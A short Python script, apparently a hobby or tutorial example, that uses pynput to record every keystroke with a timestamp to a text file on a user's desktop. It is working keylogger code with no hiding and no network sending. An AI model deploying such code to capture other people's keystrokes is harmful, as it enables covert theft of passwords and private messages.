# importing libraries
from pynput.keyboard import Key, Listener
import logging

# setting path for log file
print("Logging key strokes started")
path = r"C:/Users/Saiprasad/Desktop/"
logging.basicConfig(filename=(path + "Keystroke.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')


# function to log keys
def on_press(key):
    logging.info(str(key))


with Listener(on_press=on_press) as listener:
    listener.join()
